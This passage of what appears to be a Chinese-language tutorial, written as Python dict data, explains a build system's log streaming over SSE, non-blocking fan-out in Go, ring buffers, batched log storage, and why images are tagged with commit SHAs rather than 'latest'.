         ["适用场景", "<strong>构建日志（纯单向）← 本系统选它</strong>", "聊天、协同编辑（需要双向）"]]),

  dict(type="code", h="SSE 的实现朴素到令人意外", lang="text", body="""HTTP 响应头：  Content-Type: text/event-stream
              Cache-Control: no-cache
              Connection: keep-alive

然后【保持连接不关】，持续往里写：

  data: {"seq":1,"ts":"10:24:28","text":"$ npm run build"}\n\n
  data: {"seq":2,"ts":"10:24:29","text":"&gt; web-api@1.0.0 build"}\n\n
  data: {"seq":3,...}\n\n

前端用浏览器原生的 EventSource 接收，几行代码。"""),

  dict(type="text", body="""
<p><strong>核心难点：fan-out（扇出）与慢消费者。</strong>一份日志要同时发给多个地方：</p>"""),

  dict(type="flow", h="日志管道拓扑", body="""                        ┌──▶ 环形缓冲区（存最近 N 行，供新连接补历史）
                        │
容器 stdout/stderr ──▶ LogPipe ──▶ 批量落库（每 200 行或每 2 秒 flush 一次）
                        │
                        └──▶ 扇出给每个订阅者 ──▶ 各自的 channel ──▶ SSE 响应
                                                                  （可能同时有 3 个人在看）"""),

  dict(type="warn", h="必须处理好的问题：如果某个订阅者很慢怎么办？", body="""
比如有人用手机 3G 网络看日志，或者开了页面就去吃饭了，浏览器不读数据。"""),

  dict(type="code", lang="go", body="""<span class="bad">// ❌ 错误写法</span>
<span class="k">for</span> _, ch := <span class="k">range</span> p.subs {
    ch &lt;- line        <span class="c">// 如果这个订阅者的 channel 满了，这里会【阻塞】</span>
}
<span class="c">// 后果链条：</span>
<span class="c">//   一个卡住的浏览器 → 阻塞整个日志写入 → 阻塞构建容器读取输出</span>
<span class="c">//   → 容器输出缓冲区满 → 构建进程被卡住 → 构建失败</span>
<span class="c">// 【一个看日志的人，搞崩了一次构建】</span>

<span class="good">// ✅ 正确写法</span>
<span class="k">for</span> _, ch := <span class="k">range</span> p.subs {
    <span class="k">select</span> {
    <span class="k">case</span> ch &lt;- line:
    <span class="k">default</span>:                    <span class="c">// channel 满了？立刻放弃，绝不等待</span>
        p.dropped.Add(<span class="n">1</span>)        <span class="c">// 记一下丢了多少行</span>
    }
}"""),

  dict(type="tip", body="""
<strong>原则：宁可给慢的订阅者丢几行日志，也绝不能让它拖垮构建。</strong><br><br>
丢的行会在它重连时通过环形缓冲区补上（浏览器自动重连并带上 <code>Last-Event-ID</code>）。"""),

  dict(type="text", body="""
<p><strong>环形缓冲区（ring buffer）</strong>是一个固定大小的循环数组，写满就从最开头覆盖：</p>"""),

  dict(type="flow", body="""容量 500 行。写到第 501 行时，覆盖掉第 1 行。

  [451][452]...[500][1][2]...[450]
   ↑ 最旧                 ↑ 最新
   └────── 写指针绕圈 ──────┘"""),

  dict(type="kv", h="环形缓冲的两个作用", items=[
    ("内存有上限", "一个构建可能输出 50 万行日志，全存内存会爆。环形缓冲只保留最近的，旧的已经落库了"),
    ("新订阅者补历史", "你打开页面时构建已经跑了一半 → 缓冲区里最近的 500 行立刻推给你，然后接上实时流"),
    ("前端也用了一遍", "<span class='mono'>useLogStream</span> 里同样限制行数，超出丢最旧的 —— 长时间开着页面看日志，不能把浏览器内存吃光")]),

  dict(type="code", h="落库策略：批量而非逐行", lang="text", body="""<span class="bad">❌ 每行一次 INSERT：</span>
   50 万行 = 50 万次磁盘写入 = 数据库被打死

<span class="good">✅ 攒够 200 行 或 到 2 秒，一次 INSERT 一个 chunk（还可 zstd 压缩）</span>

这就是为什么日志表设计成 log_chunks（分块存 BLOB）而不是一行一条记录：

   CREATE TABLE log_chunks (
       build_id  INTEGER NOT NULL REFERENCES builds(id) ON DELETE CASCADE,
       seq       INTEGER NOT NULL,     -- 分块序号，便于分段拉取
       content   BLOB    NOT NULL,     -- 可压缩
       UNIQUE(build_id, seq)
   );"""),
 ]),

dict(id="s8", num="⑧", status="design",
 title="产物与镜像 tag：为什么不用 latest",
 sub="不可变基础设施 —— 回滚能力的根基",
 sections=[
  dict(type="text", body="""
<p>构建成功后产出一个 Docker 镜像，打上标签：<code>web-api:a3f9c21</code>（用 commit SHA）。</p>"""),

  dict(type="analogy", body="""
<strong>latest 就像把文件都命名成「新建文档.docx」。</strong><br><br>
每次保存都覆盖同一个名字，你永远不知道现在这个「新建文档」是哪一版，
更不可能回到上周三那个版本。<br><br>
用 SHA 命名就像<strong>论文的版本号</strong>：<code>论文_v1.docx</code>、<code>论文_v2.docx</code> ——
每一版都独立存在，随时能翻回任何一版。"""),

  dict(type="table", cols=["", "!用 latest", "!用 commit SHA"],
   rows=[["版本可辨识性", "<span class='no'>不知道 latest 现在到底是哪个版本</span>", "<span class='yes'>tag 与代码版本一一对应，永久不变</span>"],
         ["回滚", "<span class='no'>回滚到哪个 latest？<strong>没法回滚</strong></span>", "<span class='yes'>重新部署 <span class='mono'>web-api:7b1e044</span> 即可</span>"],
         ["审计", "<span class='no'>说不清线上跑的是什么</span>", "<span class='yes'>看到 tag 就知道是哪次提交</span>"],
         ["并发部署", "<span class='no'>两个构建都推 latest，互相覆盖</span>", "<span class='yes'>各自独立 tag，互不干扰"]]),

  dict(type="tip", h="这叫「不可变基础设施」（Immutable Infrastructure）", body="""
<strong>版本一旦产出就不再修改，要改就产新版本。</strong><br><br>
好处是回滚变得极其简单 —— 不需要「撤销」什么，只需要把指针指回上一个版本。
这也是第 ⑩ 站「自动回滚能在几秒内完成」的前提：<em>回滚不需要重新构建</em>。"""),
 ]),
]
